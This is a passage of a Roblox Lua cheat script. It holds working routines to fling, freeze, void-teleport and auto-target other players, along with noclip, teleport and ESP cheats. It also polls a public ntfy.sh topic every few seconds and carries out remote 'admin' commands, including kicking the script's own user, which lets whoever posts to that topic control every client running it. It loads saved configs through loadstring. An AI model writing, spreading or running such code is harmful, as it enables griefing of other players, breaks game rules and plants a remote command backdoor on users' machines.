    local Handle=Accessory and Accessory:FindFirstChild("Handle")
    if not (Character and Humanoid and RootPart) then return end
    local OldPos=RootPart.CFrame
    if RootPart.Velocity.Magnitude<50 then OldPos=RootPart.CFrame end
    if THumanoid and THumanoid.Sit then return end
    if THead then workspace.CurrentCamera.CameraSubject=THead
    elseif Handle then workspace.CurrentCamera.CameraSubject=Handle
    elseif THumanoid then workspace.CurrentCamera.CameraSubject=THumanoid end
    if not TCharacter:FindFirstChildWhichIsA("BasePart") then return end
    local StartPos = TRootPart and TRootPart.Position or (THead and THead.Position)
    local StartTime = tick()
    local MAX_TIME = 3
    local MAX_DIST = 10000
    local function checkStop()
        if not FlingActive then return true end
        if tick() - StartTime > MAX_TIME then return true end
        if StartPos then
            local cur = TRootPart and TRootPart.Position or (THead and THead.Position)
            if cur and (cur - StartPos).Magnitude > MAX_DIST then
                stopFlinging()
                return true
            end
        end
        return false
    end
    local FPos=function(BasePart,Pos,Ang)
        RootPart.CFrame=CFrame.new(BasePart.Position)*Pos*Ang
        Character:SetPrimaryPartCFrame(CFrame.new(BasePart.Position)*Pos*Ang)
        RootPart.Velocity=Vector3.new(9e7,9e7*10,9e7)
        RootPart.RotVelocity=Vector3.new(9e8,9e8,9e8)
    end
    local SFBasePart=function(BasePart)
        local Angle=0
        repeat
            if RootPart and THumanoid then
                if BasePart.Velocity.Magnitude<50 then
                    Angle=Angle+100
                    FPos(BasePart,CFrame.new(0,1.5,0)+THumanoid.MoveDirection*BasePart.Velocity.Magnitude/1.25,CFrame.Angles(math.rad(Angle),0,0)) task.wait()
                    FPos(BasePart,CFrame.new(0,-1.5,0)+THumanoid.MoveDirection*BasePart.Velocity.Magnitude/1.25,CFrame.Angles(math.rad(Angle),0,0)) task.wait()
                else
                    FPos(BasePart,CFrame.new(0,1.5,THumanoid.WalkSpeed),CFrame.Angles(math.rad(90),0,0)) task.wait()
                    FPos(BasePart,CFrame.new(0,-1.5,-THumanoid.WalkSpeed),CFrame.Angles(0,0,0)) task.wait()
                    FPos(BasePart,CFrame.new(0,1.5,THumanoid.WalkSpeed),CFrame.Angles(math.rad(90),0,0)) task.wait()
                    FPos(BasePart,CFrame.new(0,-1.5,0),CFrame.Angles(math.rad(90),0,0)) task.wait()
                    FPos(BasePart,CFrame.new(0,-1.5,0),CFrame.Angles(0,0,0)) task.wait()
                end
            end
        until checkStop()
    end
    local FPDH=workspace.FallenPartsDestroyHeight; workspace.FallenPartsDestroyHeight=0/0
    local BV=Instance.new("BodyVelocity"); BV.Parent=RootPart
    BV.Velocity=Vector3.new(0,0,0); BV.MaxForce=Vector3.new(9e9,9e9,9e9)
    Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated,false)
    if TRootPart then SFBasePart(TRootPart) elseif THead then SFBasePart(THead) elseif Handle then SFBasePart(Handle) end
    BV:Destroy(); Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated,true)
    workspace.CurrentCamera.CameraSubject=Humanoid; workspace.FallenPartsDestroyHeight=FPDH
    if OldPos then
        local t0=tick()
        repeat
            RootPart.CFrame=OldPos*CFrame.new(0,.5,0)
            Character:SetPrimaryPartCFrame(OldPos*CFrame.new(0,.5,0))
            Humanoid:ChangeState("GettingUp")
            for _,part in pairs(Character:GetChildren()) do
                if part:IsA("BasePart") then part.Velocity,part.RotVelocity=Vector3.new(),Vector3.new() end
            end
            task.wait()
        until (RootPart.Position-OldPos.p).Magnitude<25 or tick()-t0 > 2
    end
end

local function startFlinging()
    if FlingActive then return end
    FlingActive=true
    local count = math.max(1, tonumber(GlobalConfig.flingCount) or 1)
    FlingThread=task.spawn(function()
        local iter = 0
        while FlingActive and iter < count do
            iter = iter + 1
            local valid={}
            for name,plr in pairs(FlingTargets) do
                if plr and plr.Parent and plr.Character then valid[name]=plr else FlingTargets[name]=nil end
            end
            for _,plr in pairs(valid) do
                if FlingActive then SkidFling(plr); task.wait(0.1) else break end
            end
            task.wait(0.3)
        end
        FlingActive = false
    end)
end

local function stopFlinging() FlingActive=false end

local function singleFling(plr)
    FlingActive=true
    task.spawn(function() SkidFling(plr); FlingActive=false end)
end

local touchFlingActive = false
local function startTouchFling()
    if touchFlingActive then return end
    touchFlingActive=true; GlobalConfig.touchFlingEnabled=true
    task.spawn(function()
        local vel,movel
        while touchFlingActive do
            RunService.Heartbeat:Wait()
            local c=LP.Character; local hrp=c and c:FindFirstChild("HumanoidRootPart")
            if hrp then
                vel=hrp.Velocity; hrp.Velocity=vel*10000+Vector3.new(0,10000,0)
                RunService.RenderStepped:Wait()
                if hrp and hrp.Parent then hrp.Velocity=vel end
                RunService.Stepped:Wait()
                if hrp and hrp.Parent then hrp.Velocity=vel+Vector3.new(0,movel or 0.1,0); movel=(movel or 0.1)*-1 end
            end
        end
    end)
end
local function stopTouchFling() touchFlingActive=false; GlobalConfig.touchFlingEnabled=false end

local Movement = { tpWalkConn=nil, noclipConn=nil, infJumpConn=nil, ctrlTPConn=nil }

local function toggleTpWalk(enable)
    enable = enable ~= nil and enable or not GlobalConfig.tpWalkEnabled
    GlobalConfig.tpWalkEnabled = enable
    if Movement.tpWalkConn then Movement.tpWalkConn:Disconnect(); Movement.tpWalkConn=nil end
    if not enable then return end
    Movement.tpWalkConn = RunService.Heartbeat:Connect(function(dt)
        local c=LP.Character; local hrp=c and c:FindFirstChild("HumanoidRootPart")
        local hum=c and c:FindFirstChildOfClass("Humanoid")
        if not hrp or not hum then return end
        local moveDir = hum.MoveDirection
        if moveDir.Magnitude > 0 then
            local newPos = hrp.Position + moveDir * GlobalConfig.tpWalkSpeed * dt
            hrp.CFrame = CFrame.new(newPos) * (hrp.CFrame - hrp.CFrame.Position)
        end
    end)
end

local function toggleNoclip(enable)
    enable = enable ~= nil and enable or not GlobalConfig.noclipEnabled
    GlobalConfig.noclipEnabled = enable
    if Movement.noclipConn then Movement.noclipConn:Disconnect(); Movement.noclipConn=nil end
    if not enable then return end
    Movement.noclipConn = RunService.Stepped:Connect(function()
        local c = LP.Character
        if not c then return end
        for _, part in pairs(c:GetDescendants()) do
            if part:IsA("BasePart") and part.CanCollide then part.CanCollide = false end
        end
    end)
end

local function toggleInfJump(enable)
    enable = enable ~= nil and enable or not GlobalConfig.infJumpEnabled
    GlobalConfig.infJumpEnabled = enable
    if Movement.infJumpConn then Movement.infJumpConn:Disconnect(); Movement.infJumpConn=nil end
    if not enable then return end
    Movement.infJumpConn = UserInputService.JumpRequest:Connect(function()
        local c = LP.Character
        local hum = c and c:FindFirstChildOfClass("Humanoid")
        if hum then hum:ChangeState(Enum.HumanoidStateType.Jumping) end
    end)
end

local function toggleCtrlClickTP(enable)
    enable = enable ~= nil and enable or not GlobalConfig.ctrlClickTP
    GlobalConfig.ctrlClickTP = enable
    if Movement.ctrlTPConn then Movement.ctrlTPConn:Disconnect(); Movement.ctrlTPConn=nil end
    if not enable then return end
    Movement.ctrlTPConn = UserInputService.InputBegan:Connect(function(input, gp)
        if gp then return end
        if input.UserInputType == Enum.UserInputType.MouseButton1
           and (UserInputService:IsKeyDown(Enum.KeyCode.LeftControl) or UserInputService:IsKeyDown(Enum.KeyCode.RightControl)) then
            local mouse = LP:GetMouse()
            local target = mouse.Hit and mouse.Hit.Position
            if target then
                local mr = LP.Character and LP.Character:FindFirstChild("HumanoidRootPart")
                if mr then
                    pcall(function() mr.CFrame = CFrame.new(target + Vector3.new(0,3,0)) end)
                    notify("TP", Theme.accent)
                end
            end
        end
    end)
end

LP.CharacterAdded:Connect(function()
    task.wait(1)
    if GlobalConfig.noclipEnabled then toggleNoclip(true) end
end)

local tpCD, pulseT, scanAcc, labelAcc = 0,0,0,0
RunService.Heartbeat:Connect(function(dt)
    tpCD=math.max(0,tpCD-dt); pulseT=pulseT+dt
    scanAcc=scanAcc+dt; labelAcc=labelAcc+dt
    local doScan = scanAcc >= 0.1; if doScan then scanAcc=0 end
    local doLabels = labelAcc >= 0.15; if doLabels then labelAcc=0 end
    local myRoot = LP.Character and LP.Character:FindFirstChild("HumanoidRootPart")
    local escaped, escapedForm = nil, nil

    for plr in pairs(tracked) do
        if doScan then
            local ck,fm = detectCharacter(plr)
            local prev = playerData[plr]; local lastUlt = prev and prev.lastUltTime or 0
            if ck and fm=="ult" then lastUlt=tick()
            elseif ck and fm=="base" then
                local d=Characters[ck]; local mt=d and d.ultMemoryTime or 0
                if mt>0 and lastUlt>0 and (tick()-lastUlt)<mt then fm="ult" end
            end
            playerData[plr] = ck and {charKey=ck, form=fm, lastUltTime=lastUlt} or nil

            if ck then
                local ms = findMoveset(plr)
                if ms then
                    local d = Characters[ck]
                    if not ultMoveWasOnCD[plr] then ultMoveWasOnCD[plr] = {} end
                    for moveName, enabled in pairs(d.ultTPToggles or {}) do
                        if enabled then
                            local mv = ms:FindFirstChild(moveName)
                            local onCD = false
                            if mv then
                                local v = mv:GetAttribute("onCDS")
                                onCD = (v == true)
                            end
                            local prevCD = ultMoveWasOnCD[plr][moveName] or false
                            if onCD and not prevCD then
                                escaped = ck
                                escapedForm = "ult"
                            end
                            ultMoveWasOnCD[plr][moveName] = onCD
                        end
                    end
                end
            end

            if GlobalConfig.autoFlingEnabled and GlobalConfig.autoFlingChar ~= "" then
                local matched = false
                if ck and ck == GlobalConfig.autoFlingChar then matched = true
                elseif plr.Name:lower() == GlobalConfig.autoFlingChar:lower() then matched = true
                elseif plr.Name:lower():sub(1, #GlobalConfig.autoFlingChar) == GlobalConfig.autoFlingChar:lower() then matched = true end
                if matched and not isAntiFling(plr, ck) and not FlingTargets[plr.Name] then
                    singleFling(plr)
                end
            end
        end
        local info = playerData[plr]
        local ck = info and info.charKey; local fm = info and info.form
        if doLabels then updateNameLabel(plr, ck, fm) end
        if not ck then
            if highlights[plr] then removeHighlight(plr) end
        else
            local d = Characters[ck]
            local hlOn = (fm=="ult") and d.highlightUlt or d.highlightBase
            if not GlobalConfig.espEnabled then
                if highlights[plr] then removeHighlight(plr) end
            elseif hlOn then applyHighlight(plr, ck, fm)
            elseif highlights[plr] then removeHighlight(plr) end
            if highlights[plr] and fm=="ult" and GlobalConfig.pulseUlt then
                local pulse=0.15+0.15*math.sin(pulseT*4)
                highlights[plr].instance.FillTransparency=GlobalConfig.fillTransparency+pulse
            elseif highlights[plr] then
                highlights[plr].instance.FillTransparency=GlobalConfig.fillTransparency
            end
            local tpEn = (fm=="ult") and d.tpFromUlt or d.tpFromBase
            if tpEn then
                updateRing(plr, d.distance or 35)
                if myRoot then
                    local tr = plr.Character and plr.Character:FindFirstChild("HumanoidRootPart")
                    if tr and (tr.Position-myRoot.Position).Magnitude < (d.distance or 35) then
                        escaped=ck; escapedForm=fm
                    end
                end
            else
                removeRing(plr)
            end
        end
    end

    if escaped and myRoot and tpCD<=0 then
        tpCD=GlobalConfig.cooldown
        local d=Characters[escaped]
        if d then
            pcall(function() myRoot.CFrame=CFrame.new(d.position) end)
            if GlobalConfig.soundAlert then alertSound:Play() end
            local nm=d.name[CurrentLang] or d.name.en
            local col=(escapedForm=="ult") and d.colorUlt or d.colorBase
            notify("TP — "..nm, col)
        end
    end
end)

local CONFIG_FOLDER = "KJTest_Configs"
local function ensureFolder()
    if makefolder and isfolder and not isfolder(CONFIG_FOLDER) then pcall(makefolder, CONFIG_FOLDER) end
end

local function ser(v, indent)
    indent = indent or ""
    local t = type(v)
    if t == "number" then return tostring(v)
    elseif t == "boolean" then return tostring(v)
    elseif t == "string" then return string.format("%q", v)
    elseif t == "table" then
        local nextIndent = indent .. "    "
        local lines = {}
        local keys = {}
        for k in pairs(v) do table.insert(keys, k) end
        table.sort(keys, function(a,b) return tostring(a) < tostring(b) end)
        for _, k in ipairs(keys) do
            local val = v[k]
            local key
            if type(k) == "string" and k:match("^[%a_][%w_]*$") then
                key = k
            else
                key = "[" .. ser(k, nextIndent) .. "]"
            end
            table.insert(lines, nextIndent .. key .. " = " .. ser(val, nextIndent))
        end
        if #lines == 0 then return "{}" end
        return "{\n" .. table.concat(lines, ",\n") .. "\n" .. indent .. "}"
    elseif typeof then
        local tt = typeof(v)
        if tt == "Color3" then
            return string.format("Color3.fromRGB(%d, %d, %d)",
                math.floor(v.R*255+.5), math.floor(v.G*255+.5), math.floor(v.B*255+.5))
        end
        if tt == "Vector3" then
            return string.format("Vector3.new(%d, %d, %d)", math.floor(v.X), math.floor(v.Y), math.floor(v.Z))
        end
    end
    return "nil"
end

local function buildCfg()
    local o = { Characters = {}, Global = {} }
    for k,d in pairs(Characters) do
        local ultT = {}
        for mvName, state in pairs(d.ultTPToggles or {}) do
            ultT[mvName] = state
        end
        o.Characters[k] = {
            colorBase = d.colorBase,
            colorUlt = d.colorUlt,
            highlightBase = d.highlightBase,
            highlightUlt = d.highlightUlt,
            showName = d.showName,
            showHp = d.showHp,
            tpFromBase = d.tpFromBase,
            tpFromUlt = d.tpFromUlt,
            distance = d.distance,
            position = d.position,
            ultTPToggles = ultT,
        }
    end
    local keybindsOut = {}
    for k, v in pairs(GlobalConfig.keybinds) do
        keybindsOut[k] = v.Name
    end
    o.Global = {
        cooldown = GlobalConfig.cooldown,
        soundAlert = GlobalConfig.soundAlert,
        notifications = GlobalConfig.notifications,
        pulseUlt = GlobalConfig.pulseUlt,
        espEnabled = GlobalConfig.espEnabled,
        fillTransparency = GlobalConfig.fillTransparency,
        outlineTransparency = GlobalConfig.outlineTransparency,
        tpWalkSpeed = GlobalConfig.tpWalkSpeed,
        tpWalkEnabled = GlobalConfig.tpWalkEnabled,
        noclipEnabled = GlobalConfig.noclipEnabled,
        infJumpEnabled = GlobalConfig.infJumpEnabled,
        ctrlClickTP = GlobalConfig.ctrlClickTP,
        hideAllHp = GlobalConfig.hideAllHp,
        hideAllNames = GlobalConfig.hideAllNames,
        showUltBar = GlobalConfig.showUltBar,
        nameShowDuration = GlobalConfig.nameShowDuration,
        flingCount = GlobalConfig.flingCount,
        autoFlingChar = GlobalConfig.autoFlingChar,
        autoFlingEnabled = GlobalConfig.autoFlingEnabled,
        antiFlingChars = GlobalConfig.antiFlingChars,
        keybinds = keybindsOut,
    }
    return o
end

local function applyCfg(cfg)
    if not cfg then return end
    if cfg.Characters then
        for k,s in pairs(cfg.Characters) do
            local d=Characters[k]
            if d then
                for f,v in pairs(s) do
                    if f == "ultTPToggles" and type(v) == "table" then
                        for mvName, state in pairs(v) do
                            d.ultTPToggles[mvName] = state
                        end
                    else
                        d[f]=v
                    end
                end
            end
        end
    end
    if cfg.Global then
        for k,v in pairs(cfg.Global) do
            if k == "keybinds" and type(v) == "table" then
                for bindName, keyName in pairs(v) do
                    if GlobalConfig.keybinds[bindName] and type(keyName) == "string" then
                        pcall(function()
                            GlobalConfig.keybinds[bindName] = Enum.KeyCode[keyName]
                        end)
                    end
                end
            else
                GlobalConfig[k] = v
            end
        end
    end
end

local function saveCfg(name)
    ensureFolder()
    if not writefile then return false, "no writefile" end
    local ok,err = pcall(writefile, CONFIG_FOLDER.."/"..name..".lua", "return "..ser(buildCfg()))
    return ok, err
end

local function loadCfg(name)
    if not readfile then return nil, "no readfile" end
    local ok,c = pcall(readfile, CONFIG_FOLDER.."/"..name..".lua")
    if not ok then return nil,c end
    local fn,e = loadstring(c); if not fn then return nil,e end
    local ok2,d = pcall(fn); if not ok2 then return nil,d end
    return d
end

local function delCfg(name)
    if not delfile then return false, "no delfile" end
    return pcall(delfile, CONFIG_FOLDER.."/"..name..".lua")
end

local function listCfg()
    if not listfiles then return {} end
    ensureFolder()
    local out={}
    local ok,list = pcall(listfiles, CONFIG_FOLDER)
    if ok and list then
        for _,f in ipairs(list) do
            local n=f:match("([^/\\]+)%.lua$"); if n then table.insert(out,n) end
        end
    end
    return out
end

task.spawn(function()
    task.wait(1)
    if GlobalConfig.autoLoadConfig ~= "" then
        local ok, data = pcall(loadCfg, GlobalConfig.autoLoadConfig)
        if ok and data then applyCfg(data) end
    end
end)

local CHAT_TOPIC = "kj_test_v9_global_chat_2024_abc"
local chatMessages = {}
local chatSeen = {}
local chatOk = false

local function chatPoll()
    if not http then return end
    local res = http("GET", "https://ntfy.sh/"..CHAT_TOPIC.."/json?poll=1&since=1m", nil, {}, 12)
    if not res or not res.Body then return end
    chatOk = true
    for line in res.Body:gmatch("[^\n]+") do
        local ok, d = pcall(HttpService.JSONDecode, HttpService, line)
        if ok and d and d.event == "message" and d.id then
            if not chatSeen[d.id] then
                chatSeen[d.id] = true
                local user = d.title or "?"
                local text = d.message or ""
                local dup = false
                local now = os.time()
                for _, m in ipairs(chatMessages) do
                    if m.user == user and m.text == text and (now - (m.time or 0)) < 20 then
                        dup = true
                        break
                    end
                end
                if not dup then
                    table.insert(chatMessages, {user = user, text = text, time = d.time or now})
                    if #chatMessages > 200 then table.remove(chatMessages, 1) end
                end
            end
        end
    end
end

local function chatSend(msg)
    if not http then return false end
    local res = http("POST", "https://ntfy.sh/"..CHAT_TOPIC, msg, {["Title"] = LP.Name}, 15)
    if not res then return false end
    table.insert(chatMessages, {user = LP.Name, text = msg, time = os.time(), self = true})
    if #chatMessages > 200 then table.remove(chatMessages, 1) end
    return true
end

task.spawn(function()
    while true do
        pcall(chatPoll)
        task.wait(3)
    end
end)

local ADMIN_TOPIC = "kj_admin_v9_2024_xyz"
local adminSeen = {}

local function findPlayerByName(name)
    if not name or name == "" then return nil end
    name = name:lower()
    for _, p in ipairs(Players:GetPlayers()) do
        if p ~= LP and (p.Name:lower() == name or p.Name:lower():sub(1, #name) == name) then
            return p
        end
    end
    return nil
end

local function softKick(plr, reason)
    if not plr or not plr.Character then return end
    local hrp = plr.Character:FindFirstChild("HumanoidRootPart")
    if not hrp then return end
    task.spawn(function()
        for i = 1, 100 do
            pcall(function() hrp.CFrame = CFrame.new(0, -100000 - i * 1000, 0) end)
            task.wait(0.05)
        end
    end)
    notify("Kick: " .. plr.Name, Theme.danger)
end

local function tpToVoid(plr)
    if not plr or not plr.Character then return end
    local hrp = plr.Character:FindFirstChild("HumanoidRootPart")
    if hrp then pcall(function() hrp.CFrame = CFrame.new(0, -100000, 0) end) end
    notify("Void: " .. plr.Name, Theme.danger)
end

local function tpToCoords(plr, x, y, z)
    if not plr or not plr.Character then return end
    local hrp = plr.Character:FindFirstChild("HumanoidRootPart")
    if hrp then pcall(function() hrp.CFrame = CFrame.new(x, y, z) end) end
    notify("TP: " .. plr.Name, Theme.accent)
end

local function hidePlayer(plr)
    if not plr then return end
    adminHiddenPlayers[plr.Name] = true
    removeHighlight(plr)
    local bb = labels[plr]
    if bb then bb.Enabled = false end
    notify("Hidden: " .. plr.Name, Theme.danger)
end

local function revealPlayer(plr)
    if not plr then return end
    adminHiddenPlayers[plr.Name] = nil
    local bb = labels[plr]
    if bb then bb.Enabled = true end
    notify("Revealed: " .. plr.Name, Theme.success)
end

local frozenPlayers = {}

local function freezePlayer(plr)
    if not plr or not plr.Character then return end
    local hrp = plr.Character:FindFirstChild("HumanoidRootPart")
    if not hrp then return end
    frozenPlayers[plr.Name] = true
    task.spawn(function()
        while frozenPlayers[plr.Name] do
            local h = plr.Character and plr.Character:FindFirstChild("HumanoidRootPart")
            if not h then break end
            pcall(function()
                h.Anchored = true
                h.Velocity = Vector3.new(0,0,0)
                h.RotVelocity = Vector3.new(0,0,0)
            end)
            task.wait(0.05)
        end
    end)
    notify("Frozen: " .. plr.Name, Theme.warn)
end

local function unfreezePlayer(plr)
    if not plr then return end
    frozenPlayers[plr.Name] = nil
    local hrp = plr.Character and plr.Character:FindFirstChild("HumanoidRootPart")
    if hrp then pcall(function() hrp.Anchored = false end) end
    notify("Unfrozen: " .. plr.Name, Theme.success)
end

local function bringPlayer(plr)
    if not plr or not plr.Character then return end
    local hrp = plr.Character:FindFirstChild("HumanoidRootPart")
    local mr = LP.Character and LP.Character:FindFirstChild("HumanoidRootPart")
    if hrp and mr then pcall(function() hrp.CFrame = mr.CFrame + Vector3.new(0,3,0) end) end
    notify("Brought: " .. plr.Name, Theme.success)
end

local function processAdminCommand(cmd)
    if not cmd or cmd == "" then return end
    local parts = {}
    for s in cmd:gmatch("[^|]+") do table.insert(parts, s) end
    local action = (parts[1] or ""):lower()
    if action == "kick" then softKick(findPlayerByName(parts[2] or ""), parts[3] or "admin")
    elseif action == "tpvoid" then tpToVoid(findPlayerByName(parts[2] or ""))
    elseif action == "tp" then
        local x = tonumber(parts[3]); local y = tonumber(parts[4]); local z = tonumber(parts[5])
        if x and y and z then tpToCoords(findPlayerByName(parts[2] or ""), x, y, z) end
    elseif action == "hide" then hidePlayer(findPlayerByName(parts[2] or ""))
    elseif action == "reveal" then revealPlayer(findPlayerByName(parts[2] or ""))
    elseif action == "freeze" then freezePlayer(findPlayerByName(parts[2] or ""))
    elseif action == "unfreeze" then unfreezePlayer(findPlayerByName(parts[2] or ""))
    elseif action == "bring" then bringPlayer(findPlayerByName(parts[2] or ""))
    elseif action == "kickme" then LP:Kick(parts[2] or "admin") end
end

local function adminPoll()
    if not http then return end
    local res = http("GET", "https://ntfy.sh/"..ADMIN_TOPIC.."/json?poll=1&since=2m", nil, {}, 12)
    if not res or not res.Body then return end
    for line in res.Body:gmatch("[^\n]+") do
        local ok, d = pcall(HttpService.JSONDecode, HttpService, line)
        if ok and d and d.event == "message" and d.id then
            if not adminSeen[d.id] then
                adminSeen[d.id] = true
                task.spawn(function() processAdminCommand(d.message or "") end)
            end
        end
    end
end

task.spawn(function()
    while true do
        pcall(adminPoll)
        task.wait(4)
    end
end)

local screenGui, pickerPopup
local subtitleRef
local chatGuiRef, chatWindowRef, chatContentRef
local chatIconRef
local killstreakLabel
local killstreak = 0
local lastKills = nil

local function newCorner(p,r)
    local c=Instance.new("UICorner"); c.CornerRadius=UDim.new(0,r or 8); c.Parent=p; return c
end
local function newStroke(p,c,t)
    local s=Instance.new("UIStroke"); s.Color=c or Theme.accentDark
    s.Thickness=t or 1; s.ApplyStrokeMode=Enum.ApplyStrokeMode.Border; s.Parent=p; return s
end

local function openColorPicker(initial, cb)
    if pickerPopup then pickerPopup:Destroy(); pickerPopup=nil end
    local p=Instance.new("Frame"); p.Name="CP"; p.Size=UDim2.new(0,280,0,340)
    p.Position=UDim2.new(0.5,-140,0.5,-170); p.BackgroundColor3=Theme.bgCard
    p.BorderSizePixel=0; p.ZIndex=600; p.Active=true; p.Draggable=true; p.Parent=screenGui
    newCorner(p,12); newStroke(p,Theme.accentDark,1.5); pickerPopup=p
    local t=Instance.new("TextLabel"); t.Size=UDim2.new(1,-50,0,30); t.Position=UDim2.new(0,14,0,6)
    t.BackgroundTransparency=1; t.Text="Цвет"; t.TextColor3=Theme.text
    t.Font=Enum.Font.GothamBold; t.TextSize=14; t.TextXAlignment=Enum.TextXAlignment.Left; t.ZIndex=601; t.Parent=p
    local cx=Instance.new("TextButton"); cx.Size=UDim2.new(0,30,0,30); cx.Position=UDim2.new(1,-36,0,6)
    cx.BackgroundColor3=Theme.danger; cx.BorderSizePixel=0; cx.Text="x"
    cx.TextColor3=Color3.new(1,1,1); cx.Font=Enum.Font.GothamBold; cx.TextSize=14
    cx.ZIndex=601; cx.Parent=p; newCorner(cx,6)
    local h,s,v = Color3.toHSV(initial)
    local sq=Instance.new("Frame"); sq.Size=UDim2.new(1,-28,0,190); sq.Position=UDim2.new(0,14,0,44)
    sq.BackgroundColor3=Color3.fromHSV(h,1,1); sq.BorderSizePixel=0; sq.ZIndex=601
    sq.ClipsDescendants=true; sq.Parent=p; newCorner(sq,8)
    local so=Instance.new("Frame"); so.Size=UDim2.new(1,0,1,0); so.BackgroundColor3=Color3.new(1,1,1)
    so.BorderSizePixel=0; so.ZIndex=602; so.Parent=sq
    local sg=Instance.new("UIGradient"); sg.Transparency=NumberSequence.new{NumberSequenceKeypoint.new(0,0),NumberSequenceKeypoint.new(1,1)}; sg.Parent=so
    local vo=Instance.new("Frame"); vo.Size=UDim2.new(1,0,1,0); vo.BackgroundColor3=Color3.new(0,0,0)
    vo.BorderSizePixel=0; vo.ZIndex=603; vo.Parent=sq
    local vg=Instance.new("UIGradient"); vg.Rotation=90; vg.Transparency=NumberSequence.new{NumberSequenceKeypoint.new(0,1),NumberSequenceKeypoint.new(1,0)}; vg.Parent=vo
    local cs=Instance.new("Frame"); cs.Size=UDim2.new(0,18,0,18); cs.AnchorPoint=Vector2.new(0.5,0.5)
    cs.BackgroundColor3=Color3.new(1,1,1); cs.BorderSizePixel=0; cs.ZIndex=604
    cs.Position=UDim2.new(s,0,1-v,0); cs.Parent=sq; newCorner(cs,999); newStroke(cs,Color3.new(0,0,0),2)
    local hb=Instance.new("Frame"); hb.Size=UDim2.new(1,-28,0,24); hb.Position=UDim2.new(0,14,0,246)
    hb.BackgroundColor3=Color3.new(1,1,1); hb.BorderSizePixel=0; hb.ZIndex=601
    hb.ClipsDescendants=true; hb.Parent=p; newCorner(hb,8)
    local hg=Instance.new("UIGradient"); hg.Color=ColorSequence.new{
        ColorSequenceKeypoint.new(0,Color3.fromRGB(255,0,0)),
        ColorSequenceKeypoint.new(0.167,Color3.fromRGB(255,255,0)),
        ColorSequenceKeypoint.new(0.333,Color3.fromRGB(0,255,0)),
        ColorSequenceKeypoint.new(0.5,Color3.fromRGB(0,255,255)),
        ColorSequenceKeypoint.new(0.667,Color3.fromRGB(0,0,255)),
        ColorSequenceKeypoint.new(0.833,Color3.fromRGB(255,0,255)),
        ColorSequenceKeypoint.new(1,Color3.fromRGB(255,0,0))}; hg.Parent=hb
    local hc=Instance.new("Frame"); hc.Size=UDim2.new(0,10,1,4); hc.AnchorPoint=Vector2.new(0.5,0.5)
    hc.Position=UDim2.new(h,0,0.5,0); hc.BackgroundColor3=Color3.new(1,1,1); hc.BorderSizePixel=0
    hc.ZIndex=604; hc.Parent=hb; newCorner(hc,4); newStroke(hc,Color3.new(0,0,0),2)
    local hex=Instance.new("TextLabel"); hex.Size=UDim2.new(1,-28,0,28); hex.Position=UDim2.new(0,14,0,278)
    hex.BackgroundColor3=Theme.bgAlt; hex.BorderSizePixel=0; hex.Text=colorToHex(initial)
    hex.TextColor3=Theme.text; hex.Font=Enum.Font.GothamBold; hex.TextSize=13; hex.ZIndex=601; hex.Parent=p; newCorner(hex,6)
    local ok=Instance.new("TextButton"); ok.Size=UDim2.new(1,-28,0,30); ok.Position=UDim2.new(0,14,1,-38)
    ok.BackgroundColor3=Theme.success; ok.BorderSizePixel=0; ok.Text="OK"; ok.TextColor3=Color3.new(1,1,1)
    ok.Font=Enum.Font.GothamBold; ok.TextSize=14; ok.ZIndex=601; ok.Parent=p; newCorner(ok,7)
    local cH,cS,cV=h,s,v
    local function upd()
        sq.BackgroundColor3=Color3.fromHSV(cH,1,1)
        cs.Position=UDim2.new(cS,0,1-cV,0); hc.Position=UDim2.new(cH,0,0.5,0)
        local c=Color3.fromHSV(cH,cS,cV); hex.Text=colorToHex(c)
        if cb then cb(c) end
    end
    local sa,ha=false,false
    local function uS(inp)
        local rp,sz=sq.AbsolutePosition, sq.AbsoluteSize
        cS=math.clamp((inp.Position.X-rp.X)/sz.X,0,1)
        cV=1-math.clamp((inp.Position.Y-rp.Y)/sz.Y,0,1); upd()
    end
    local function uH(inp)
        local rp,sz=hb.AbsolutePosition, hb.AbsoluteSize
        cH=math.clamp((inp.Position.X-rp.X)/sz.X,0,1); upd()
    end
    sq.InputBegan:Connect(function(i) if i.UserInputType==Enum.UserInputType.MouseButton1 or i.UserInputType==Enum.UserInputType.Touch then sa=true; uS(i) end end)
    hb.InputBegan:Connect(function(i) if i.UserInputType==Enum.UserInputType.MouseButton1 or i.UserInputType==Enum.UserInputType.Touch then ha=true; uH(i) end end)
    local cC=UserInputService.InputChanged:Connect(function(i)
        if i.UserInputType==Enum.UserInputType.MouseMovement or i.UserInputType==Enum.UserInputType.Touch then
            if sa then uS(i) end; if ha then uH(i) end
        end
    end)
    local cE=UserInputService.InputEnded:Connect(function(i)
        if i.UserInputType==Enum.UserInputType.MouseButton1 or i.UserInputType==Enum.UserInputType.Touch then sa,ha=false,false end
    end)
    local function close() cC:Disconnect(); cE:Disconnect(); p:Destroy()
        if pickerPopup==p then pickerPopup=nil end
    end
    ok.MouseButton1Click:Connect(close); cx.MouseButton1Click:Connect(close)
end

local BTN_H = IS_MOBILE and 46 or 34
local INPUT_H = IS_MOBILE and 44 or 32
local SMALL_FONT = IS_MOBILE and 14 or 12
local BIG_FONT = IS_MOBILE and 15 or 13

local function makeSection(parent, text, order)
    local f=Instance.new("Frame"); f.Size=UDim2.new(1,0,0,IS_MOBILE and 32 or 28); f.BackgroundTransparency=1
    f.LayoutOrder=order; f.Parent=parent
    local l=Instance.new("TextLabel"); l.Size=UDim2.new(1,0,1,0); l.BackgroundTransparency=1
    l.Text=text; l.TextColor3=Theme.accent2; l.Font=Enum.Font.GothamBold
    l.TextSize=IS_MOBILE and 14 or 13; l.TextXAlignment=Enum.TextXAlignment.Left; l.Parent=f; return f
end

local function makeToggle(parent, text, initial, order, cb)
    local f=Instance.new("Frame"); f.Size=UDim2.new(1,0,0,BTN_H+2); f.BackgroundColor3=Theme.bgCard
    f.BorderSizePixel=0; f.LayoutOrder=order; f.Parent=parent; newCorner(f,8)
    local l=Instance.new("TextLabel"); l.Size=UDim2.new(1,-80,1,0); l.Position=UDim2.new(0,14,0,0)
    l.BackgroundTransparency=1; l.Text=text; l.TextColor3=Theme.text
    l.Font=Enum.Font.Gotham; l.TextSize=SMALL_FONT
    l.TextXAlignment=Enum.TextXAlignment.Left; l.Parent=f
    local b=Instance.new("TextButton"); b.Size=UDim2.new(0,IS_MOBILE and 64 or 56,0,BTN_H-8)
    b.Position=UDim2.new(1,-(IS_MOBILE and 74 or 66),0.5,-(BTN_H-8)/2)
    b.BackgroundColor3=initial and Theme.success or Color3.fromRGB(60,60,80)
